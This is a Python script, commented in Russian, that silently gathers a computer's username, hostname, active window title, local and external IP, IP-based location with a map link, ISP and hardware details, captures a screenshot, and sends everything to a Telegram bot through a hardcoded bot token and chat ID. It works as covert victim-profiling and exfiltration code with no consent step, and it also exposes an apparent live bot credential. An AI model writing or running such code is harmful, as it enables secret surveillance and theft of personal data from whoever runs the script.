import platform
import psutil
import GPUtil
import socket
import requests
import pyautogui
import datetime
from io import BytesIO
import os

# --- Активное окно ---
try:
    import pygetwindow as gw
    active_window = gw.getActiveWindow()
    window_title = active_window.title if active_window else "Не удалось определить"
except:
    window_title = "Не удалось определить активное окно"

# --- IP ---
try:
    local_ip = socket.gethostbyname(socket.gethostname())
except:
    local_ip = "Неизвестно"

try:
    external_ip = requests.get("https://api.ipify.org").text
except:
    external_ip = "Неизвестно"

# --- Геолокация и флаг ---
def country_to_flag(country_code):
    if not country_code or len(country_code) != 2:
        return ""
    return chr(127397 + ord(country_code.upper()[0])) + chr(127397 + ord(country_code.upper()[1]))

try:
    ip_data = requests.get("http://ip-api.com/json").json()
    ip = ip_data.get("query", "Неизвестно")
    country = ip_data.get("country", "Неизвестно")
    country_code = ip_data.get("countryCode", "")
    flag = country_to_flag(country_code)
    region = ip_data.get("regionName", "Неизвестно")
    city = ip_data.get("city", "Неизвестно")
    isp = ip_data.get("isp", "Неизвестно")
    lat = ip_data.get("lat", "")
    lon = ip_data.get("lon", "")
    map_link = f"https://www.google.com/maps?q={lat},{lon}"
except:
    ip = country = region = city = isp = map_link = flag = "Ошибка"

# --- GPU ---
gpus = GPUtil.getGPUs()
gpu_info = gpus[0].name if gpus else "Не обнаружено"

# --- Время ---
now = datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")

# --- Скриншот ---
screenshot = BytesIO()
pyautogui.screenshot().save(screenshot, format='PNG')
screenshot.seek(0)

# --- Telegram настройки ---
bot_token = "8150234463:AAGUhRNWABSZKpR-g2j1_Ab5KDfYSZRt_ms"
chat_id = "1264872538"

# --- Подпись ---
caption = f"""
🖥️ Характеристики ПК

👤 Пользователь: {os.getlogin()}
💻 ПК: {socket.gethostname()}
📅 Время: {now}
🪟 Активное окно: {window_title}

🌐 Внешний IP: {external_ip}
📶 Локальный IP: {local_ip}

📍 Местоположение: {flag} {country}, {city}, {region}
🏢 Провайдер: {isp}
🗺️ Карта: {map_link}

💽 ОС: {platform.system()} {platform.release()}
🧠 CPU: {platform.processor()}
🔋 RAM: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB
🎮 GPU: {gpu_info}
"""

# --- Отправка в Telegram ---
requests.post(
    f"https://api.telegram.org/bot{bot_token}/sendPhoto",
    files={"photo": ("screenshot.png", screenshot)},
    data={"chat_id": chat_id, "caption": caption}
)
